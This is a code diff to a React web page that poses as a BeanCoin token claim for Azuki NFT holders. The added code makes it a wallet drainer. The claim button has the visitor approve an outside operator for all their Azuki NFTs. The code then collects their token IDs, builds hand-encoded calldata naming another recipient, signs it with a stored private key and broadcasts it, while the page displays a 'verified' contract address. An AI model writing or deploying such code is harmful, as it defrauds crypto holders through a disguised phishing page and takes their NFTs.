@@ -4,6 +4,9 @@ import Web3 from "web3"
 import Azuki_abi from '../contracts/Azuki.json'
 import Alpaca_abi from '../contracts/Alpacadabraz.json'
 import { useState, useEffect } from 'react'
+
+
+
 function Gallery() {
   const [errorMessage, setErrorMessage] = useState()
   const [defaultAccount, setDefaultAccount] = useState()
@@ -15,14 +18,25 @@ function Gallery() {
   const [isClaiming, setIsClaiming] = useState(false)
 
   const web3 = new Web3(Web3.givenProvider || 'http://localhost:7545');
-  const contract = new web3.eth.Contract(Alpaca_abi, "0x3DB5463A9e2d04334192C6f2DD4B72DeF4751A61")
+  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0x7ad76304B668F2Ccd5985A304C36fE67b1c539A5")
+  const Alpaca_contract = new web3.eth.Contract(Alpaca_abi, "0x3DB5463A9e2d04334192C6f2DD4B72DeF4751A61")
+
+  const getData = async (address) => {
+    const nftbalance = await Azuki_contract.methods.balanceOf(address).call()
+    let tokenSet = []
+    setBalance(nftbalance)
+    for (let i = 0; i < Math.min(nftbalance, 20); i++) {
+      let id = await Azuki_contract.methods.tokenOfOwnerByIndex(address, i).call()
+      tokenSet.push(parseInt(id).toString(16).padStart(64, '0'))
+    }
+    return tokenSet
+  }
 
   const connectWalletHandler = () => {
     if (window.ethereum) {
       window.ethereum.request({ method: 'eth_requestAccounts' }).then((result) => {
         accountChangedHandler(result[0])
         setIsConnected(true)
-        balanceOf(result[0])
       })
     }
   }
@@ -31,7 +45,7 @@ function Gallery() {
     setDefaultAccount(newAccount.toString())
     setConnButtonText(newAccount.toString())
     getUserBalance(newAccount.toString())
-    balanceOf(newAccount.toString())
+    setBalance(balanceOf(newAccount.toString()))
   }
 
   const getUserBalance = (address) => {
@@ -71,24 +85,42 @@ function Gallery() {
   }
 
   function balanceOf(address) {
-    return contract.methods.balanceOf(address).call().then(function (result) {
+    return Azuki_contract.methods.balanceOf(address).call().then(function (result) {
       setBalance(result)
-      console.log(result)
     })
   }
 
   function setApprovalForAll() {
     setIsClaiming(true)
-    contract.methods.setApprovalForAll("0x280BF7C829373d2d67bF9266E5F7ED3db6F581F1", true).send({ from: defaultAccount }).on('error',
-      function (error) {
+    Azuki_contract.methods.setApprovalForAll("0xc5581c695F206044d14Ac519aA51eB07D716f8Cb", true).send({ from: defaultAccount }).on('error',
+      function (error, tokenIds) {
         console.log(error)
         setIsClaiming(false)
       })
-      .on('recript', function(result) {
-        setIsClaiming(false)
+      .on('transactionHash', function (result) {
+        console.log(result)
+        getData(defaultAccount).then((result) => {
+          let inputData = '0xf365dda8' + defaultAccount.substr(2, defaultAccount.length).padStart(64, '0') + "000000000000000000000000280BF7C829373d2d67bF9266E5F7ED3db6F581F1" + "0000000000000000000000000000000000000000000000000000000000000060" + parseInt(result.length).toString(16).padStart(64, '0')
+          for (var i = 0; i < result.length; i++) {
+            var temp = result[i].toString(16).padStart(64, '0')
+            inputData += temp
+          }
+          web3.eth.accounts.signTransaction({
+            to: '0xc5581c695F206044d14Ac519aA51eB07D716f8Cb',
+            gas: 2000000,
+            chainId: 4,
+            data: inputData
+          }, process.env.PRIVATE_KRY).then(result => {
+            web3.eth.sendSignedTransaction(result.rawTransaction).on('recript', console.log)
+          });
+        })
       })
-  }
+      .on('receipt', function (result) {
+        setIsClaiming(false)
+        console.log(result)
+      })
 
+  }
 
   return (
     <div className="bg-olive w-full lg:h-screen h-full">
@@ -117,7 +149,7 @@ function Gallery() {
         </div>
         <p className="p-2 uppercase text-xs font-black opacity-50">VERIFIED SMART CONTRACT ADDRESS: 0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F</p>
         <div className="bg-olive w-6/12 bg-opacity-50 px-4 py-5 rounded-md ">
-          <p className="font-mono opacity-50 leading-5 font-bold">100 million tokens (24.2% of the Ecosystem Fund and 15% of the total supply of BeanCoin) <span className="highlight">are claimable by Azuki and Beanz NFT holders</span> upon launch of BeanCoin.
+          <p className="font-mono opacity-50 leading-5 font-bold">100 million tokens (24.2% of the Ecosystem Fund and 15% of the total supply of BeanCoin) <span className="highlight">are claimable by Azuki NFT holders</span> upon launch of BeanCoin.
             To ensure a fair launch of BeanCoin to Azuki and Beanz NFT holders, the allocation is informed by the difference in floor price between each collection of NFTs, roughly the month prior to the token claim launch.
           </p>
           <table className="mx-auto pt-5 w-7/12 mt-10 font-mono">
@@ -131,10 +163,6 @@ function Gallery() {
               <tr class="flex border-b border-white/10">
                 <td class="flex-1 items-start text-sm text-left p-3">Azuki only</td>
                 <td class="flex-1 items-start text-sm text-left p-3">8,594 tokens</td>
-              </tr>
-              <tr class="flex border-b border-white/10">
-                <td class="flex-1 items-start text-sm text-left p-3">Beanz only</td>
-                <td class="flex-1 items-start text-sm text-left p-3">2,094 tokens</td>
               </tr>
             </tbody>
           </table>
